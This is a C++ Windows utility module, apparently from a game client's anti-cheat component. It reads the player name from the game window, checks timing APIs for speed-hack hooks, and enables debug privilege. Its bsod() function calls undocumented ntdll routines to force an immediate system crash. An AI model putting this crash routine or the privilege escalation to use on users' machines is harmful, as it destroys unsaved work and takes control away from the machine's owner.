#include <Windows.h>
#include "Units.h"
#include <strsafe.h>
#include <process.h>

#pragma comment(lib,"Version.lib" )

Units::Units()
{
}

Units::~Units()
{
}

// 获取游戏窗口玩家角色名
unsigned __stdcall Units::get_game_window_username () {
	while (true) {
		DWORD dwCurPid = 0;
		// 获取游戏窗口
		HWND hWnd = FindWindow (L"TfrmMain", nullptr);
		GetWindowThreadProcessId (hWnd, &dwCurPid);  //通过窗口句柄获取进程的pid
		//if (dwCurPid == _getpid() && GetParent(hWnd) == NULL)
		if (dwCurPid == _getpid ()) {
			WCHAR txtBuf[MAX_PATH] = { 0 };
			GetWindowText (hWnd, txtBuf, sizeof (txtBuf));
			WCHAR *pStr = wcsstr (txtBuf, L" - ");
			if (pStr) {
				WCHAR buf[MAX_PATH] = { 0 };
				swprintf_s(buf, L"%s", (WCHAR*)(pStr + 3));      //从窗口标题中取出用户名部分
				if (buf[0] != 0) {
					if (wcscmp (g_name, buf) != 0)      //判断用户名是否已经存储过
					{
						int i = 0;
						while(true) {						
							if (txtBuf[i] == ' ') {
								break;
							}
							i++;
						}

						memset (&sd_name, 0, sizeof (Send_Data));
						sd_name.nId = 0;
						wcscpy_s(g_name, buf);
						wcscat_s(sd_name.first_name, L"ELF-");
						wcscat_s(sd_name.first_name, buf);
						bfirst = true;
						WCHAR str[MAX_PATH] = { 0 };
						memmove(str, txtBuf, i);
						wcscat_s(str, L"-");
						wcscat_s(str, buf);
						wcscpy_s(sd_name.update_name, str);
					}
				}
			}
		}
		Sleep (1000);
	}
	return 0;
}

// 执行蓝屏
void Units::bsod () {
	HMODULE ntdll = GetModuleHandle (L"ntdll.dll");
	FARPROC RtlAdjustPrivilege = GetProcAddress (ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress (ntdll, "NtRaiseHardError");
	unsigned char ErrKill;
	long unsigned int HDErr;
	((void (*)(DWORD, BOOLEAN, BOOLEAN, PBOOLEAN))RtlAdjustPrivilege)(0x13, TRUE, FALSE, &ErrKill);
	((void (*)(NTSTATUS, DWORD, DWORD, PVOID, DWORD, LPDWORD))NtRaiseHardError)(0xC000021A, 4, 1, NULL, 6, &HDErr);
}

// 获取文件的原始文件名
void Units::get_original_file_name (LPCWSTR szVersionFile, LPWSTR OriginalFilename) {
	DWORD  verHandle = NULL;
	UINT   cbTranslate = 0;
	LPBYTE lpBuffer = NULL;
	DWORD  verSize = GetFileVersionInfoSize(szVersionFile, &verHandle);
	HRESULT hr;
	struct LANGANDCODEPAGE {
		WORD wLanguage;
		WORD wCodePage;
	} *lpTranslate;

	if (verSize != NULL) {
		PCHAR verData = new char[verSize];

		if (GetFileVersionInfo (szVersionFile, verHandle, verSize, verData)) {
			if (VerQueryValue (verData, L"\\VarFileInfo\\Translation", (LPVOID*)&lpTranslate, &cbTranslate)) {
				if (cbTranslate) {
					for (unsigned int i = 0; i < (cbTranslate / sizeof (struct LANGANDCODEPAGE)); i++) {
						STRSAFE_LPWSTR SubBlock = { 0 };
						LPVOID lpBuffer = NULL;
						UINT dwSize;
						// szName = "Comments" or "CompanyName" or "FileDescription" or "FileVersion" or
						//          "InternalName" or "LegalCopyright" or "LegalTrademarks" or "OriginalFilename" or
						//          "PrivateBuild" or "ProductName" or "ProductVersion" or "SpecialBuild"
						hr = StringCchPrintf (SubBlock, MAX_PATH, TEXT ("\\StringFileInfo\\%04x%04x\\%s"), lpTranslate[i].wLanguage, lpTranslate[i].wCodePage, "OriginalFilename");
						if (FAILED (hr)) {
							// TODO: write error handler.
						}

						VerQueryValue (verData, SubBlock, &lpBuffer, &dwSize);
						if (lpBuffer != nullptr && dwSize > 0) {
							wcscpy_s (OriginalFilename, 100, (wchar_t*)lpBuffer);
						}
					}

				}
			}
		}
		delete[] verData;
	}
}

// 提升权限
void Units::power() {
	TOKEN_PRIVILEGES tp;
	HANDLE hToken;
	LUID luid;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)){
		if (LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid)){
			tp.PrivilegeCount = 1;
			tp.Privileges[0].Luid = luid;
			if (TRUE){
				tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			}
			else {
				tp.Privileges[0].Attributes = 0;
			}

			//提升进程权限
			if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)){
				//MessageBox(NULL, "提权失败。", NULL, MB_ICONERROR | MB_SYSTEMMODAL);
			}
		}
	}
}

// 检测变速
bool Units::detection_speed () {
	HMODULE handle = GetModuleHandleA ("kernel32.dll");
	LoadLibraryA ("winmm.dll");
	FARPROC GetTickCountAddr = GetProcAddress (handle, "GetTickCount");
	FARPROC QueryPerformanceCounterAddr = GetProcAddress (handle, "QueryPerformanceCounter");
	FARPROC timeGetTimeAddr = GetProcAddress (GetModuleHandleA ("winmm.dll"), "timeGetTime");
	if ((GetTickCountAddr != nullptr && *(BYTE*)GetTickCountAddr == 0xE9)
		|| (QueryPerformanceCounterAddr != nullptr && *(BYTE*)QueryPerformanceCounterAddr == 0xE9)
		|| (timeGetTimeAddr != nullptr && *(BYTE*)timeGetTimeAddr == 0xE9)) {
		return true;
	} else {
		return false;
	}
}

bool Units::start() {
	return false;
}

bool Units::stop() {
	return false;
}

bool Units::get_last_error() {
	return false;
}